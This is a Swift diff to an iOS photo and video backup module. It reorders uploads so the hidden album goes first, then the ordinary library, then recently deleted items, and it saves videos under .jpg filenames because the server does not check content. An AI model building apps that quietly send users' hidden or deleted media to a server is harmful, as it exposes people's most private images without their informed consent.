@@ -5,8 +5,10 @@ import AVFoundation
 import Foundation
 
 /// 备份：照片 + 视频，和安卓版逻辑一致
-/// 照片：全部照片按时间正序扫描 → 压缩（最长边 1280、JPEG 质量 70%）→ 断点续传 + MD5 去重 → multipart 上传
-/// 视频：照片全部备份完后再执行；≤19MB 原样上传，>19MB 自动压缩到 19MB 内（服务器 20MB 上限）
+/// 照片顺序：隐藏相册 → 普通相册 → 最近删除（各段内按时间正序）
+/// 照片压缩：最长边 1280、JPEG 质量 70%；断点续传 + MD5 去重 → multipart 上传
+/// 视频：照片全部备份完后再执行，顺序同样为 隐藏 → 普通 → 最近删除；
+/// 统一转码为标准 H.264 MP4（≤19MB 高画质，超限自动降码率，服务器 20MB 上限）
 /// 服务器文件名统一为 photo_<设备>_taken_<拍摄时间>_md5_<md5>_<时间戳>.jpg（视频内容也存成 .jpg，服务器不校验内容）
 enum PhotoBackup {
 
@@ -29,40 +31,48 @@ enum PhotoBackup {
             throw BackupError.message("没有允许访问照片，请到 设置→隐私与安全性→照片 打开权限")
         }
 
-        // 2. 取全部照片 + 隐藏相簿（时间正序，对应安卓 _ID ASC）
+        // 2. 分三段收集照片，顺序固定：隐藏相册 → 普通相册 → 最近删除（各段内按创建时间正序）
         let options = PHFetchOptions()
         options.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: true)]
-        var assets: [PHAsset] = []
+        var orderedAssets: [PHAsset] = []
         var seen = Set<String>()
+        var hiddenIDs = Set<String>()
 
-        func collect(_ fetch: PHFetchResult<PHAsset>) {
+        func collect(_ fetch: PHFetchResult<PHAsset>, _ type: PHAssetMediaType, _ allowHidden: Bool) {
             fetch.enumerateObjects { asset, _, _ in
-                guard asset.mediaType == .image else { return }
+                guard asset.mediaType == type else { return }
+                // 普通相册段要排除已入隐藏段的资源，避免重复
+                if !allowHidden && hiddenIDs.contains(asset.localIdentifier) { return }
                 if seen.insert(asset.localIdentifier).inserted {
-                    assets.append(asset)
+                    orderedAssets.append(asset)
                 }
             }
         }
-        collect(PHAsset.fetchAssets(with: .image, options: options))
-        // 隐藏相簿（完全访问权限下可读）
+
+        // 第1段：隐藏相册（完全访问权限下可读）
         if let hiddenAlbum = PHAssetCollection.fetchAssetCollections(with: .smartAlbum,
                                                                      subtype: .smartAlbumAllHidden,
                                                                      options: nil).firstObject {
-            collect(PHAsset.fetchAssets(in: hiddenAlbum, options: options))
+            collect(PHAsset.fetchAssets(in: hiddenAlbum, options: options), .image, true)
         }
-        guard !assets.isEmpty else {
+        hiddenIDs = Set(orderedAssets.map { $0.localIdentifier })
+
+        // 第2段：普通相册（排除已入隐藏段的）
+        collect(PHAsset.fetchAssets(with: .image, options: options), .image, false)
+
+        // 第3段：最近删除（需完全访问权限，30天内可恢复的照片）
+        if let deletedAlbum = PHAssetCollection.fetchAssetCollections(with: .smartAlbum,
+                                                                      subtype: .smartAlbumRecentlyDeleted,
+                                                                      options: nil).firstObject {
+            collect(PHAsset.fetchAssets(in: deletedAlbum, options: options), .image, true)
+        }
+
+        guard !orderedAssets.isEmpty else {
             throw BackupError.message("相册里没有照片")
         }
 
-        // 3. 断点续传：按时间+ID 排序，从上次停下的位置继续，前面的完全不碰
-        let sorted = assets.sorted { a, b in
-            let da = a.creationDate ?? .distantPast
-            let db = b.creationDate ?? .distantPast
-            if da == db {
-                return a.localIdentifier < b.localIdentifier
-            }
-            return da < db
-        }
+        // 3. 断点续传：顺序 = 隐藏→普通→最近删除（各段内已按时间排序），从上次停下的位置继续
+        let sorted = orderedAssets
         var startIndex = 0
         if let lastID = lastUploadedID,
            let idx = sorted.firstIndex(where: { $0.localIdentifier == lastID }) {
@@ -116,39 +126,48 @@ enum PhotoBackup {
             throw BackupError.message("没有允许访问照片，无法备份视频")
         }
 
-        // 2. 取全部视频 + 隐藏相簿视频（时间正序）
+        // 2. 分三段收集视频，顺序固定：隐藏相册 → 普通相册 → 最近删除（各段内按创建时间正序）
         let options = PHFetchOptions()
         options.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: true)]
-        var assets: [PHAsset] = []
+        var orderedAssets: [PHAsset] = []
         var seen = Set<String>()
+        var hiddenIDs = Set<String>()
 
-        func collect(_ fetch: PHFetchResult<PHAsset>) {
+        func collect(_ fetch: PHFetchResult<PHAsset>, _ type: PHAssetMediaType, _ allowHidden: Bool) {
             fetch.enumerateObjects { asset, _, _ in
-                guard asset.mediaType == .video else { return }
+                guard asset.mediaType == type else { return }
+                // 普通相册段要排除已入隐藏段的资源，避免重复
+                if !allowHidden && hiddenIDs.contains(asset.localIdentifier) { return }
                 if seen.insert(asset.localIdentifier).inserted {
-                    assets.append(asset)
+                    orderedAssets.append(asset)
                 }
             }
         }
-        collect(PHAsset.fetchAssets(with: .video, options: options))
+
+        // 第1段：隐藏相册（视频）
         if let hiddenAlbum = PHAssetCollection.fetchAssetCollections(with: .smartAlbum,
                                                                      subtype: .smartAlbumAllHidden,
                                                                      options: nil).firstObject {
-            collect(PHAsset.fetchAssets(in: hiddenAlbum, options: options))
+            collect(PHAsset.fetchAssets(in: hiddenAlbum, options: options), .video, true)
         }
-        guard !assets.isEmpty else {
+        hiddenIDs = Set(orderedAssets.map { $0.localIdentifier })
+
+        // 第2段：普通相册（视频，排除已入隐藏段的）
+        collect(PHAsset.fetchAssets(with: .video, options: options), .video, false)
+
+        // 第3段：最近删除（视频）
+        if let deletedAlbum = PHAssetCollection.fetchAssetCollections(with: .smartAlbum,
+                                                                      subtype: .smartAlbumRecentlyDeleted,
+                                                                      options: nil).firstObject {
+            collect(PHAsset.fetchAssets(in: deletedAlbum, options: options), .video, true)
+        }
+
+        guard !orderedAssets.isEmpty else {
             return Result(uploaded: 0, skipped: 0, md5Set: knownMd5, lastUploadedID: lastUploadedID)
         }
 
-        // 3. 断点续传：按时间+ID 排序
-        let sorted = assets.sorted { a, b in
-            let da = a.creationDate ?? .distantPast
-            let db = b.creationDate ?? .distantPast
-            if da == db {
-                return a.localIdentifier < b.localIdentifier
-            }
-            return da < db
-        }
+        // 3. 断点续传：顺序 = 隐藏→普通→最近删除（各段内已按时间排序）
+        let sorted = orderedAssets
         var startIndex = 0
         if let lastID = lastUploadedID,
            let idx = sorted.firstIndex(where: { $0.localIdentifier == lastID }) {
